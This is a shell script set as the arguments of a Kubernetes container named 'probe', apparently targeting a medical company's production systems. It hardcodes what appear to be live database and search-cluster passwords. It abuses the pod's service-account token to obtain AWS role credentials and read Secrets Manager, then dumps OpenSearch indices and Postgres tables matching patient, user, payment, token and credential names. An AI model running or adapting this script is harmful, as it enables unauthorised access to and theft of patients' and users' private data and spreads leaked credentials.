containers.name: probe
args:
#!/bin/sh
set -u
ENV="prod"
OS_URL="https://vpc-lazamedical-prod01-domain-irc7dbxrtxnuvpuwobjmfd2gbe.us-west-2.es.amazonaws.com"
OS_PW="Wxt2G4@qK7MnF!BpJ3L9pYVXCJ#TdfM8"
PG_HOST="lazamedical-dp-prod01-usw2-postgresql-rds.clg4mimw6718.us-west-2.rds.amazonaws.com"
PG_DB="dp_service"
PG_U="postgres_admin"
PG_PW="O7-=&m^RCS^wO~G97;tgAq|8gj|3=`Kj"
PG1_HOST="lazamedical-dp-prod01-usw2-postgresql1-proxy.proxy-clg4mimw6718.us-west-2.rds.amazonaws.com"
PG1_DB="dp_service"
PG1_U="postgres_admin"
PG1_SSM_PW="20cqQmAytQDA3INm"
PG1_SECRET_ARN="arn:aws:secretsmanager:us-west-2:959737396140:secret:lazamedical-dp-prod01-usw2-postgresql-db1-secret-N3ubHt"
DB_NS="data-management"
MYSQL_HOST="lazamedical-prod01-usw2-mysql-rds1.clg4mimw6718.us-west-2.rds.amazonaws.com"
MYSQL_SSM_PW="tRnX*N7yNpzt2vs_"
echo "===I2970B_START env=$ENV host=$(hostname) utc=$(date -u +%FT%TZ)==="
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token)
API=https://kubernetes.default.svc
apk add --no-cache curl jq aws-cli postgresql-client mariadb-client >/tmp/apk.log 2>&1; echo "apk_rc=$?"
for b in curl jq aws psql mysql; do command -v $b >/dev/null 2>&1 && echo "have $b" || echo "MISSING $b"; done
get(){ curl -s -m 20 -k -H "Authorization: Bearer $TOKEN" "$1"; }
post(){ curl -s -m 20 -k -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -X POST -d "$2" "$1"; }
echo "===STEP0_DNS==="
nslookup "$(echo "$OS_URL" | sed 's#https://##')" 2>&1 | head -6
nslookup "$PG_HOST" 2>&1 | head -6
nslookup "$PG1_HOST" 2>&1 | head -6
nslookup "$MYSQL_HOST" 2>&1 | head -6

echo "===STEP1_OPENSEARCH==="
OSC(){ curl -sk -m 25 -u "admin:$OS_PW" "$1"; }
echo "---OS_HEALTH---"
OSC "$OS_URL/_cluster/health" | head -c 1500; echo
echo "---OS_INDICES---"
OSC "$OS_URL/_cat/indices?format=json&h=health,status,index,docs.count,store.size" > /tmp/idx.json 2>/dev/null
echo "idx_bytes=$(wc -c < /tmp/idx.json)"
OSC "$OS_URL/_cat/indices?v&h=health,status,index,docs.count,store.size&s=store.size:desc" 2>/dev/null | head -60
echo "---OS_NODES---"
OSC "$OS_URL/_cat/nodes?v&h=ip,name,version,heap.percent,disk.avail" 2>/dev/null | head -20
jq -r '.[] | select((.docs.count|tonumber? // 0) > 0) | .index' /tmp/idx.json 2>/dev/null | grep -Ei 'event-logger|user|token|secret|auth|config|notif|patient|study' | head -12 > /tmp/os_sel.txt
echo "---OS_SELECTED---"; cat /tmp/os_sel.txt 2>/dev/null
jq -r '.[] | .index' /tmp/idx.json 2>/dev/null | grep -Ei '^event' | head -3 > /tmp/os_el.txt
for i in $(cat /tmp/os_el.txt 2>/dev/null); do
  echo "---OS_EL_ADMIN_PORTAL $i---"
  OSC "$OS_URL/$i/_search?q=ADMIN_PORTAL&size=50" | jq -c '{total:(.hits.total), hits:[.hits.hits[]._source]}' 2>/dev/null | head -c 60000; echo
  echo "---OS_EL_ADMIN_Q $i---"
  OSC "$OS_URL/$i/_search?q=admin&size=20" | jq -c '{total:(.hits.total), hits:[.hits.hits[]._source]}' 2>/dev/null | head -c 40000; echo
done
echo "---OS_SAMPLES---"
for i in $(cat /tmp/os_sel.txt 2>/dev/null); do
  echo "---OS_SAMPLE $i---"
  OSC "$OS_URL/$i/_search?size=50" | jq -c '.hits.hits[]._source' 2>/dev/null | head -c 30000; echo
done

echo "===STEP2_SM_PGSQL1==="
SAS=$(get "$API/api/v1/namespaces/$DB_NS/serviceaccounts")
SAN=$(echo "$SAS" | jq -r '.items[]|select(.metadata.annotations["eks.amazonaws.com/role-arn"]!=null)|.metadata.name' 2>/dev/null | head -1)
ROLE=$(echo "$SAS" | jq -r --arg san "$SAN" '.items[]|select(.metadata.name==$san)|.metadata.annotations["eks.amazonaws.com/role-arn"] // empty' 2>/dev/null | head -1)
echo "SA=$SAN ROLE=$ROLE"
PG1_SM_USER=""; PG1_SM_PW=""; PG1_SM_DB=""; PG1_SM_HOST=""
if [ -n "$ROLE" ]; then
  TK=$(post "$API/api/v1/namespaces/$DB_NS/serviceaccounts/$SAN/token" '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"audiences":["sts.amazonaws.com"],"expirationSeconds":3600}}')
  WT=$(echo "$TK" | jq -r '.status.token // empty' 2>/dev/null)
  if [ -n "$WT" ]; then
    RES=$(aws sts assume-role-with-web-identity --role-arn "$ROLE" --role-session-name i2970b --web-identity-token "$WT" --duration-seconds 1800 --region us-west-2 --output json 2>&1)
    if echo "$RES" | jq -e '.Credentials' >/dev/null 2>&1; then
      export AWS_ACCESS_KEY_ID=$(echo "$RES"|jq -r '.Credentials.AccessKeyId')
      export AWS_SECRET_ACCESS_KEY=$(echo "$RES"|jq -r '.Credentials.SecretAccessKey')
      export AWS_SESSION_TOKEN=$(echo "$RES"|jq -r '.Credentials.SessionToken')
      echo "ASSUME_OK"
      OUT=$(aws secretsmanager get-secret-value --secret-id "$PG1_SECRET_ARN" --region us-west-2 --query SecretString --output text 2>&1)
      echo "PG1_SECRET_RAW $(echo "$OUT" | head -c 1200)"
      PG1_SM_USER=$(echo "$OUT" | jq -r '.username // empty' 2>/dev/null)
      PG1_SM_PW=$(echo "$OUT" | jq -r '.password // empty' 2>/dev/null)
      PG1_SM_DB=$(echo "$OUT" | jq -r '.dbname // empty' 2>/dev/null)
      PG1_SM_HOST=$(echo "$OUT" | jq -r '.host // empty' 2>/dev/null)
      unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
    else
      echo "ASSUME_FAIL $(echo "$RES" | head -c 300)"
    fi
  else
    echo "TOKEN_REQ_FAIL"
  fi
else
  echo "NO_IRSA_SA"
fi

cat > /tmp/pgq.sql <<'SQL'
\set ON_ERROR_STOP off
SELECT '===BASIC===';
SELECT version(), current_database(), current_user, coalesce(inet_server_addr()::text,'-'), coalesce(inet_server_port(),0);
SELECT '===TABLE_LIST===';
SELECT table_schema||'.'||table_name||'|'||coalesce((SELECT n_live_tup FROM pg_stat_user_tables s WHERE s.schemaname=t.table_schema AND s.relname=t.table_name)::text,'-')
FROM information_schema.tables t
WHERE table_type='BASE TABLE' AND table_schema NOT IN ('pg_catalog','information_schema')
ORDER BY 1,2 LIMIT 300;
SELECT '===SECRET_COLUMNS===';
SELECT table_schema||'.'||table_name||'.'||column_name||'|'||data_type
FROM information_schema.columns
WHERE table_schema NOT IN ('pg_catalog','information_schema')
AND column_name ~* '(pass|pwd|secret|token|key|cred|auth|api|smtp|oauth|jwt|stripe|paypal|firebase|apns|fcm|llm|openai|azure|aws|conn|url|endpoint)'
ORDER BY 1,2,3 LIMIT 300;
SELECT '===SAMPLES===';
SELECT format('SELECT ''==TBL== %I.%I''; SELECT * FROM %I.%I LIMIT 50;', table_schema, table_name, table_schema, table_name)
FROM information_schema.tables
WHERE table_type='BASE TABLE' AND table_schema NOT IN ('pg_catalog','information_schema')
AND table_name ~* '(user|account|role|setting|config|integration|notif|push|payment|subscription|audit|study|token|secret|auth|credential|oauth|smtp|email|tenant|org|patient)'
ORDER BY 1 LIMIT 12;
\gexec
SELECT '===PG_DONE===';
SQL

pg_run(){
  L=$1; H=$2; U=$3; D=$4; PW=$5
  echo "===PG_BEGIN $L host=$H db=$D user=$U utc=$(date -u +%FT%TZ)==="
  PGPASSWORD="$PW" timeout 80 psql "host=$H port=5432 user=$U dbname=$D sslmode=require connect_timeout=10 application_name=i2970b" -v ON_ERROR_STOP=0 -A -F'|' -P pager=off -f /tmp/pgq.sql > /tmp/pg_$L.out 2>&1
  echo "PG_RC=$? bytes=$(wc -c < /tmp/pg_$L.out)"
  head -c 400 /tmp/pg_$L.out; echo
  grep -A400 '===SAMPLES===' /tmp/pg_$L.out | head -c 120000
  echo "===PG_END $L==="
}
pg_run dpsvc "$PG_HOST" "$PG_U" "$PG_DB" "$PG_PW"
if [ -n "$PG1_SM_PW" ]; then
  pg_run pgsql1_sm "$PG1_HOST" "${PG1_SM_USER:-$PG1_U}" "${PG1_SM_DB:-$PG1_DB}" "$PG1_SM_PW"
elif [ -n "${PG1_SM_USER:-}" ]; then
  echo "PG1_SECRET_NO_PW"
fi
pg_run pgsql1_ssm "$PG1_HOST" "$PG1_U" "$PG1_DB" "$PG1_SSM_PW"

echo "===STEP4_MYSQL_SSM_OLD==="
MYSQL_PWD="$MYSQL_SSM_PW" timeout 45 mysql --connect-timeout=10 --protocol=tcp -h "$MYSQL_HOST" -P 3306 -u admin -D user_management --batch -N -e "SELECT VERSION(), CURRENT_USER(), DATABASE();" 2>&1 | head -c 1200
echo ""
echo "===I2970B_DONE env=$ENV utc=$(date -u +%FT%TZ)==="
